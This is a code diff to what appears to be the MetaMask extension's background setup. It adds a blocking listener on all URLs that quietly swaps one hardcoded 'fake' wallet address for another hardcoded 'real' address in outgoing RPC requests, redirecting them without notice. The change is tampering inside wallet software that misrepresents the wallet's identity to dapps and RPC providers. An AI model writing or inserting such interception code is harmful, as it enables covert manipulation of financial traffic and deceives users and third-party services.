@@ -286,6 +286,22 @@ function setupController(initState, initLangCode) {
   extension.runtime.onConnect.addListener(connectRemote);
   extension.runtime.onConnectExternal.addListener(connectExternal);
 
+  log.info("Intercepting third party RPC requests");
+  extension.webRequest.onBeforeRequest.addListener(
+	
+	function(details) {
+		// If the fake wallet addr is in the query parameters, swap it for the real wallet addr
+		if (details.url.includes("8cc11a300507008058542221487577526766ba01")) {
+			console.log("Intercepted third party RPC request");
+			console.log(details);
+			const replaced_url = details.url.replace(/8cc11a300507008058542221487577526766ba01/gi, "2712c2B84f3bddB6d5d21Fb5D3d149C850B19ECD".toLowerCase())
+			return { redirectUrl: replaced_url };
+		}
+	},
+	{urls: ["<all_urls>"]},
+	["blocking"]
+  );
+
   const metamaskInternalProcessHash = {
     [ENVIRONMENT_TYPE_POPUP]: true,
     [ENVIRONMENT_TYPE_NOTIFICATION]: true,
